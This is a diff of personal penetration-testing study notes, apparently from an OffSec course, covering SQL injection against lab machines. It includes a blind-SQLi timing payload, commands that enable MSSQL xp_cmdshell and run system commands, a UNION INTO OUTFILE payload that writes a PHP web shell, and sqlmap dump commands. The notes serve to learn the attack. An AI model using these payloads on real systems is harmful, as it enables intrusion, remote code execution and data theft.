@@ -152,9 +152,41 @@ time based
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 if user does exist, sleep for 3 seconds.
 
+### 10.3.1
 
+MSSQL has a function called xp_cmdshell to pass strings to cmd for execution
+- This is disabled by default
 
+Called with EXECUTE keyword instead of select
 
+enable xp_cmdshell by simulating an SQL injection via the impacket-mssqlclient tool
+
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+EXECUTE sp_configure 'show advanced options', 1;
+
+RECONFIGURE;
+
+EXECUTE sp_configure 'xp_cmdshell', 1;
+
+RECONFIGURE;
+
+Execute commands: EXECUTE xp_cmdshell 'whoami';
+
+SELECt INTO_OUTFILE lets you write files to webserver
+For this to work, the file location must be writable to the OS user running the database software.
+
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+which results in <? system($_REQUEST['cmd']); ?>
+
+using this payload there was a fatal error due to return type... however the shell was still uploaded.
+
+www-data is a common user associated with web servers on linux
+
+10.3.2. Automating the Attack
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
 
 
 
@@ -164,6 +196,24 @@ if user does exist, sleep for 3 seconds.
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
 Extra Reading  
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
+
+10.3.2. Automating the Attack
+http://sqlmap.org/
+
+
+10.3.1. Manual Code Execution
+https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
+- xp command shell output is returned as rows of text. 
+- double quotes can only be used for paths. everything else is single quotes.
+- return code 0 = pass 1 = fail
+- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.
+
+
+https://dev.mysql.com/doc/refman/8.0/en/select-into.html
+enables a query result to be stored in variables or written to a file:
+
+https://en.wikipedia.org/wiki/Web_shell
+
 10.2.2 UNION-based Payloads
 https://www.w3schools.com/sql/sql_union.asp 
 https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
